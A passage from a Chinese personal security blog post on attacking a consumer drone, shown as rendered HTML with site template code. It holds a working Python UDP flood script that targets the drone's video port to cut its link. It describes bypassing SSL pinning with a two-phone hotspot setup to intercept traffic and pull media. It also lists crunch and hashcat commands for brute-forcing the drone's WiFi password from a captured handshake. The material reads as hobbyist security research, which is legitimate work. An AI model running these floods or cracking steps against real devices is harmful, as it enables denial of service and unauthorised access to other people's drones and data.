 key = cv2.waitKey(<span class="number">1</span>) &amp; <span class="number">0xff</span></span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">27</span>: <span class="comment"># ESC</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">        tello.move_forward(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;s&#x27;</span>):</span><br><span class="line">        tello.move_back(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>):</span><br><span class="line">        tello.move_left(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;d&#x27;</span>):</span><br><span class="line">        tello.move_right(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;e&#x27;</span>):</span><br><span class="line">        tello.rotate_clockwise(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;q&#x27;</span>):</span><br><span class="line">        tello.rotate_counter_clockwise(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;r&#x27;</span>):</span><br><span class="line">        tello.move_up(<span class="number">30</span>)</span><br><span class="line">    <span class="keyword">elif</span> key == <span class="built_in">ord</span>(<span class="string">&#x27;f&#x27;</span>):</span><br><span class="line">        tello.move_down(<span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">tello.land()</span><br></pre></td></tr></table></figure>
+<h2 id="通信中断"><a href="#通信中断" class="headerlink" title="通信中断"></a>通信中断</h2><p>通过抓包可以看到无人机在回传视频流时使用UDP协议，发送在 62513，接收端口 7777，可以考虑向目标端口高频发包，导致其通信中断</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">udp_flood</span>(<span class="params">target_ip, target_port</span>):</span><br><span class="line">    <span class="comment"># 创建 UDP 套接字</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># 发送数据包，内容可以自定义</span></span><br><span class="line">            message = <span class="string">b&#x27;Flooding with UDP packet!&#x27;</span>  <span class="comment"># 自定义数据内容</span></span><br><span class="line">            sock.sendto(message, (target_ip, target_port))</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Sent packet to <span class="subst">&#123;target_ip&#125;</span>:<span class="subst">&#123;target_port&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.0001</span>)  <span class="comment"># 每0.0001秒发送一个数据包</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error sending packet: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    target_ip = <span class="string">&quot;192.168.10.1&quot;</span>  <span class="comment"># 目标 IP 地址</span></span><br><span class="line">    target_port = <span class="number">62513</span>  <span class="comment"># 目标端口</span></span><br><span class="line">    udp_flood(target_ip, target_port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>如果直接用手机添加抓包软件的系统证书，然后和无人机进行连接来抓包，测试发现无法解密HTTPS信息，存在SSLPinning防止中间人攻击。</p>
+<p>但是可以抓到UDP广播的包，用手机B连接无人机wifi，并打开手机热点，用手机A连接B的热点，并把抓包软件的证书挂载到系统目录，可以绕过SSLPinning，抓到手机B和无人机的流量。（看起来好像是因为这个无人机提供的图片和视频资源在回传的时候是广播的，这个接口只要在内网里就可以访问然后对无人机的图片和视频进行下载）</p>
+<h2 id="爆破wifi密码"><a href="#爆破wifi密码" class="headerlink" title="爆破wifi密码"></a>爆破wifi密码</h2><p>通过 AirCrack-ng 抓取握手包</p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1732715958590.png" alt="QQ_1732715958590.png"></p>
+<p><img src="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/QQ_1732715970433.png" alt="QQ_1732715970433.png"></p>
+<p>利用 hashcat 爆破wifi密码（用GPU服务器爆才能爆出来，有点暴力）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">crunch <span class="number">8</span> <span class="number">8</span> abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 -o <span class="built_in">dict</span>.txt</span><br><span class="line">cap2hccapx -<span class="number">02.</span>cap test.hccapx</span><br><span class="line">hashcat -m <span class="number">2500</span> test.hccapx <span class="built_in">dict</span>.txt</span><br></pre></td></tr></table></figure></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://example.com">EPs1l0h</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://example.com/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/">https://example.com/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://example.com" target="_blank">EPs1l0h's Castle</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/26/js%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"><img class="prev-cover" src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="onerror=null;src='/img/404.gif'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">js逆向初探</div></div></a></div><div class="next-post pull-right"><a href="/2024/10/03/SCTF2024-re-wp/"><img class="next-cover" src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover3.jpg?raw=true" onerror="onerror=null;src='/img/404.gif'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">SCTF2024-re-wp</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">EPs1l0h</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/EPs1l0h"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">Spears shall be shaken! Shields shall be splintered! A sword day! A red day! Ere the sun rises!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95"><span class="toc-number">1.</span> <span class="toc-text">无人机攻击想法与尝试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#GPS-%E9%9D%A2%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">2.</span> <span class="toc-text">GPS 面的攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E6%AC%A1-GPS-%E6%AC%BA%E9%AA%97%E5%AE%9E%E9%AA%8C"><span class="toc-number">2.0.1.</span> <span class="toc-text">一次 GPS 欺骗实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%B0%84%E9%A2%91%E9%9D%A2%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">3.</span> <span class="toc-text">射频面的攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E4%BF%A1%E5%8F%B7%E9%A2%91%E6%AE%B5"><span class="toc-number">3.0.1.</span> <span class="toc-text">确定信号频段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB"><span class="toc-number">3.0.2.</span> <span class="toc-text">重放攻击</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%99%AA%E5%A3%B0%E8%A6%86%E7%9B%96"><span class="toc-number">3.0.3.</span> <span class="toc-text">噪声覆盖</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#WiFi-%E9%9D%A2%E7%9A%84%E6%94%BB%E5%87%BB"><span class="toc-number">4.</span> <span class="toc-text">WiFi 面的攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Deauth-%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">Deauth 攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB-1"><span class="toc-number">4.2.</span> <span class="toc-text">重放攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E6%94%BB%E5%87%BB"><span class="toc-number">4.3.</span> <span class="toc-text">伪造攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E4%BF%A1%E4%B8%AD%E6%96%AD"><span class="toc-number">4.4.</span> <span class="toc-text">通信中断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%93%E5%8C%85"><span class="toc-number">4.5.</span> <span class="toc-text">抓包</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4wifi%E5%AF%86%E7%A0%81"><span class="toc-number">4.6.</span> <span class="toc-text">爆破wifi密码</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/11/12/%E4%B8%80%E5%A4%A9%E4%B8%80%E7%99%BE%E9%81%93buupwn/" title="一天一百道buupwn"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover3.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="一天一百道buupwn"/></a><div class="content"><a class="title" href="/2024/11/12/%E4%B8%80%E5%A4%A9%E4%B8%80%E7%99%BE%E9%81%93buupwn/" title="一天一百道buupwn">一天一百道buupwn</a><time datetime="2024-11-12T09:03:46.818Z" title="发表于 2024-11-12 17:03:46">2024-11-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/26/js%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" title="js逆向初探"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="js逆向初探"/></a><div class="content"><a class="title" href="/2024/10/26/js%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/" title="js逆向初探">js逆向初探</a><time datetime="2024-10-26T06:57:40.000Z" title="发表于 2024-10-26 14:57:40">2024-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/" title="js逆向初探"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="js逆向初探"/></a><div class="content"><a class="title" href="/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/" title="js逆向初探">js逆向初探</a><time datetime="2024-10-26T06:57:40.000Z" title="发表于 2024-10-26 14:57:40">2024-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/10/03/SCTF2024-re-wp/" title="SCTF2024-re-wp"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover3.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="SCTF2024-re-wp"/></a><div class="content"><a class="title" href="/2024/10/03/SCTF2024-re-wp/" title="SCTF2024-re-wp">SCTF2024-re-wp</a><time datetime="2024-10-03T09:11:15.000Z" title="发表于 2024-10-03 17:11:15">2024-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/09/23/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%88%9D%E4%B8%8A%E6%89%8B/" title="前端开发初上手"><img src="https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true" onerror="this.onerror=null;this.src='/img/404.gif'" alt="前端开发初上手"/></a><div class="content"><a class="title" href="/2024/09/23/%E5%89%8D%E7%AB%AF%E5%BC%80%E5%8F%91%E5%88%9D%E4%B8%8A%E6%89%8B/" title="前端开发初上手">前端开发初上手</a><time datetime="2024-09-23T02:25:10.000Z" title="发表于 2024-09-23 10:25:10">2024-09-23</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://github.com/EPs1l0h/EPs1l0h.github.io/blob/main/medias/cover/cover1.jpg?raw=true')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By EPs1l0h</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax/es5/tex-mml-chtml.min.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex/dist/contrib/copy-tex.min.js"></script><script>(() => {
+  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
+    btf.wrap(item, 'div', { class: 'katex-wrap'})
+  })
+})()</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://example.com/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/'
+    this.page.identifier = '/2024/10/26/%E6%97%A0%E4%BA%BA%E6%9C%BA%E6%94%BB%E5%87%BB%E6%83%B3%E6%B3%95%E4%B8%8E%E5%B0%9D%E8%AF%95/'
+    this.page.title = 'js逆向初探'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Disqus' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><div class="aplayer no-destroy" data-id="2981528901" data-server="netease" data-type="playlist" data-fixed="true" data-autoplay="true"> </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: false,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.tocScrollFn && window.removeEventListener('scroll', window.tocScrollFn)
+  window.scrollCollect && window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  document.getElementById('rightside').style.cssText = "opacity: ''; transform: ''"
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+  typeof disqusjs === 'object' && disqusjs.destroy()
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
